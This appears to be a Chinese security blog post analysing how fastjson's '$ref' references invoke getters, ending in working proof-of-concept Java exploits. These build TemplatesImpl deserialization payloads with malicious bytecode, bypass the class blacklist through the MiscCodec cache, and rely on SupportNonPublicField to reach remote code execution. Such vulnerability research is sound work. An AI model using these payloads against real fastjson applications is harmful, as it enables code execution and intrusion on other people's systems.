---
title: "fastjson $ref调用getter"
onlyTitle: true
date: 2024-10-24 17:04:23
categories:
- java
- 框架漏洞
tags:
- fastjson
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8112.jpg
---



之前有分析到，fastjson识别setter的流程如下：

按以下顺序判断，满足条件的话，会被当成setter调用：

- set开头，参数长度为1，非static，方法名总长度大于3
- 没有setter方法，有字段是bool类型，则用`is`加上首字母大写后的字段去查找（所以isName这种也算setter）
- 没有setter方法，有getter方法，参数长度为0，返回类型是属于Collection 或其子类、Map 或其子类、AtomicBoolean、AtomicInteger、AtomicLong的一种

那有没有更通用的调用getter的办法呢？

在Fastjson>=1.2.36时，可以用$ref的方式调用任意getter

## $ref

$ref是fastjson里的引用，引用之前出现的对象

| 语法                             | 描述               |
| -------------------------------- | ------------------ |
| {"$ref":"$"}                     | 引用根对象         |
| {"$ref":"@"}                     | 引用自己           |
| {"$ref":".."}                    | 引用父对象         |
| {"$ref":"../.."}                 | 引用父对象的父对象 |
| {"$ref":"$.members[0].reportTo"} | 基于路径的引用     |



写个Test类

```java
public class Test {
    private String cmd;

    public String getCmd() throws IOException {
        Runtime.getRuntime().exec(cmd);
        return cmd;
    }

    public void setCmd(String cmd) {
        this.cmd = cmd;
    }
}
```

使用$ref的测试：

```java
public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String payload = "[{\"@type\":\"com.yyds.Test\",\"cmd\":\"calc\"},{\"$ref\":\"$[0].cmd\"}]";
    Object o = JSON.parse(payload);
}
```

这里的`$[0]`指的是前面生成的第一个对象，也就是Test

这里只是测$ref的作用，开个autoType无所谓

## 调试

JSON.parse会调用handleResovleTask

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024160637063.png)

handleResovleTask会取出ref的内容，并判断是否以$开头，如果是，会先调用compile，然后eval

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024160829609.png)

compile就是拿JSONPath封装了一下，跟进到eval，eval先是调用init初始化，然后循环segments调用eval

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162005867.png)

进一步查看init，发现如果path不为`*`，则创建一个JSONPathParser，调用explain来解析路径

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162058533.png)

跟进到explain，解析处理如下：

* 创建一个初始容量为8的Segment数组segments，调用readSegement读取下一个段，如果读到的是null则退出循环。

* 如果读取到的段是 PropertySegment 且其 propertyName 为 "*" 且 deep 为 false，则跳过该段。

将读取到的段添加到数组中，并增加 level 计数器。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162711492.png)

其中readSegement会根据`.`分割path，童话刚刚readName取到key值（cmd），readName里面就一个toString

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163356608.png)

最后segments就只有一个cmd，没有对应的value

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163608492.png)

接着看init后的segment.eval，使用getPropertyValue获取value，怎么获取的呢？

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163649372.png)

在getPropertyValue中，因为我们的Bean是一个自定义类，使用了getJavaBeanSerializer获取序列化器，然后调用getFieldValue

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163812999.png)

这个Serializer是一个ASMSerializer，如果之前看过我的fastjson分析，就知道这后面的流程其实和JSON.toJSON的流程一样了

https://godownio.github.io/2024/10/06/fastjson-liu-cheng-fen-xi-bu-han-poc/#toJSON%E8%A7%A6%E5%8F%91getter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024164904035.png)

getFieldValue进一步调用getPropertyValue

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024164951200.png)

然后调用get

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165046197.png)

然后反射执行getter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165125865.png)



## 总结

如果我们输出parse反序列化解析后的Object，发现`{"$ref":"$[0].cmd"}`解析后的值是calc，这种引用的方式为了返回value，调用了getter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165503636.png)



## 为什么1.2.35 $ref不能触发

1.2.35的DefaultJSONParser.handleResolveTask不是直接调用JSONPath.eval

而是判断了refValue需要为JSONObject类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024170248058.png)

> 什么反向修复？





## fastjson $ref调用TemplatesImpl

搞jackson的时候提到，jackson 没有setter的情况下会调用getter，于是有TemplatesImpl链。我一拍大腿说那fastjson通过$ref也可以啊！POC

```java
public class Id_MINIMAL_Class_TemplatesImpl {
    public static void main(String[] args) throws IOException {
        String exp = readClassStr("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class");
        String jsonInput = aposToQuotes("[{'@type':'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" +
                "'transletBytecodes':['"+exp+"'],\n" +
                "'transletName':'test'},\n" +
                "{\"$ref\":\"$[0].outputProperties\"}\n" +
                "]");
        System.out.printf(jsonInput);
        JSON.parse(jsonInput);
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }

    public static String readClassStr(String cls) throws IOException {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        return Base64.encode(code1);
    }
}
```

结果发现1.2.36早就把TemplatesImpl加入黑名单了，而>=1.2.36才能通过$ref调用getter

那我强行用MiscCodec缓存绕过

```java
public class Id_MINIMAL_Class_TemplatesImpl {
    public static void main(String[] args) throws IOException {
        String exp = readClassStr("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class");
        String jsonInput = aposToQuotes("[{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"},{'@type':'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" +
                "'transletBytecodes':['"+exp+"'],\n" +
                "'transletName':'test'},\n" +
                "{\"$ref\":\"$[1].outputProperties\"}\n" +
                "]");
        System.out.printf(jsonInput);
        JSON.parse(jsonInput);
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }

    public static String readClassStr(String cls) throws IOException {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        return Base64.encode(code1);
    }
}
```

结果发现没反应也没报错

调试跟进去发现TemplatesImpl没赋上值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025121532025.png)

在我的多方调试下，终于发现，fastjson反序列化不能调用私有和保护setter进行赋值：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013111602440.png)

所以只能用Feature.SupportNonPublicField直接对字段反射赋值

```java
public class Id_MINIMAL_Class_TemplatesImpl {
    public static void main(String[] args) throws IOException {
        String exp = readClassStr("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class");
        String jsonInput = aposToQuotes("[{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"},{'@type':'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" +
                "'_bytecodes':['"+exp+"'],\n" +
                "'_name':'test'," +
                "'_tfactory':{}},\n" +
                "{\"$ref\":\"$[1].outputProperties\"}\n" +
                "]");
        System.out.printf(jsonInput);
        JSON.parse(jsonInput, Feature.SupportNonPublicField);
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }

    public static String readClassStr(String cls) throws IOException {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        return Base64.encode(code1);
    }
}
```

此贴终结